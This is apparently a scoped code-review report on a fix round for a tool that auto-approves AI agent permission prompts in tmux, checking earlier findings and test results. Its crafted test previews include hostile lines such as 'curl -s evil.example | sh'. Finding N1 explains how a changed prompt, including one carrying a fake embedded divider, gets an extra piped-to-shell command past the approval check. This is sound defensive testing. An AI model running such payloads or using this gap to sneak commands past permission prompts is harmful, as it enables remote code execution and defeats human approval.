# Scoped re-review: final fix wave bc3aff7..17963a4 (b04eb4c, 4e17a4c, 17963a4)

### Finding Verdicts

- **I1: TELEGRAM_STATE_DIR leaks to the lead's Bash children.** ADDRESSED.
  - The new `claude/plugin/scripts/telegram-env-scrub.sh` (mode 755) appends `unset TELEGRAM_STATE_DIR` to
    `$CLAUDE_ENV_FILE`. It does so only when `AGENT_BOARD_LEAD=1`, the variable is set and `CLAUDE_ENV_FILE` is set
    (line 9), and it appends only once.
  - It is registered as SessionStart in `claude/plugin/hooks/hooks.json:8`. `jq -e .` parses the file.
  - It is fail-open: every path exits 0, and the append's errors go to `/dev/null`. It is silent: nothing is printed,
    and stdin is drained. For non-leads it exits 0 at line 9.
  - Live behaviour is gated by the new e2e item 16 (poller pid before and after `claude -p`, plus `printenv`).
- **I2: `--expect` was a substring match over the whole block.** ADDRESSED for the reported defect.
  - `approve.zsh` now emits `P:` lines: for a Bash prompt only the lines between its two `╌` rules, trimmed. The
    match is whole-line equality (`P:"$ex"`).
  - Retried on real `bash-git.txt` variants:
    - single-line extension `…; curl … | sh`: refused (the fix's own tests);
    - description line equal to the expected text over a `curl` command: **refused** (here, B).
  - Residual: see New Breakage N1.
- **I3: e2e item 13 had no `--expect`.** ADDRESSED. It now runs `--expect "trust"` and expects exit 1 and no key,
  and it explains the exit 2.
- **I4: e2e item 6 diffed only `permissions.allow`.** ADDRESSED. It now diffs `jq -S '.permissions // {}'` and names
  `additionalDirectories`.
- **M1: tee missing in item 1.** ADDRESSED. Item 1 now tees to `/tmp/e2e-token.out`, and item 10 greps that file.
- **M3: copy mode.** ADDRESSED. `approve.zsh` checks `#{pane_in_mode}` after the seam and again right before
  `send-keys`, and exits 1 with `approve: <win> is in copy mode`.
- **Held doc minor: footer-line note in items 6/14.** ADDRESSED. Both items now say to `tmux-ctl read` first and
  write down any lines below the footer.
- **Held doc minor: step-3 footer sentence.** ADDRESSED. In `claude/orchestrator.md` step 3 the footer rule is now
  its own sentence.

### Checks run

- `zsh tools/tests/test_plugin.zsh`: rc=0, FAIL 0, ALL PASS.
- `zsh tools/tests/test_hook_gate.zsh`: rc=0, FAIL 0, ALL PASS.
- `zsh tools/tests/test_ctl_approve.zsh`: rc=0, FAIL 0, ALL PASS.
- `bash claude/hooks/tests/test-telegram-env-scrub.sh`: rc=0, FAIL 0, pass=10 fail=0.
- Crafted previews, all `sed` variants of the real fixtures, run through `_ap_prompt` from the branch with
  `--expect "git config user.name probe-user"` unless noted:

  | case | preview | result |
  |---|---|---|
  | A | a two-line command, `curl -s evil.example \| sh` then the approved line | PASSES (`O:1:Yes`) |
  | B | `curl` command, description equal to the expected text | refused |
  | C | a command embedding a solid divider, a fake `Bash command` header and its own `╌` rule before the approved line | PASSES; the `curl` line is not even among the `P:` lines (1 P line) |
  | D | Write prompt with an unnumbered content line `notes.txt`, `--expect "notes.txt"` | PASSES; unrealistic: real Write content lines are numbered (`1 hello`) |

  `approve` never pressed anything other than the exact `Yes` row; option labels are still exact-matched.

### New Breakage in the Fix Diff

- **N1 (Important, residual of I2; the lead decides whether the rule is acceptable).** `tools/lib/approve.zsh:52-57`
  plus the awk `P:` block. A changed prompt passes `--expect` when its preview *contains* the approved line among
  other lines.
  - Case A: the user approved `git config user.name probe-user`. The prompt now shows a two-line command, `curl … |
    sh` followed by that line, and `approve once` presses Yes.
  - Case C: an embedded divider in the preview even hides the extra line from the P set.
  - This is the "one distinctive line" rule the lead chose, but it means a single-line approval does not prove the
    same command.
  - Cheap tightening: also require the preview's P-line count to equal the `--expect` line count. A single-line
    `--expect` then matches only a one-line preview. Let `--expect` take several lines (newline-separated, compared
    line by line) for multi-line commands.
  - Add A and C as refusal tests.
- **N2 (Minor).** `docs/INSTALL.md`, the Rules line on one live lead per project, says "a `claude` started from a
  lead's shell never polls that lead's bot". That holds for Bash-tool shells only. Hooks and other non-Bash children
  of the lead still inherit `TELEGRAM_STATE_DIR` (`CLAUDE_ENV_FILE` is sourced only by Bash). No hook here starts
  `claude` (the two that do run from launchd), so the risk is low. Change "never" to "the lead's Bash commands do
  not…".

### Out-of-Scope Observations

None.

### Verdict

**Fix round:** all findings ADDRESSED as specified. One Important residual, N1 (whole-line `--expect` accepts a
changed multi-line preview that contains the approved line), goes to the lead for a decision. One Minor doc wording
(N2).
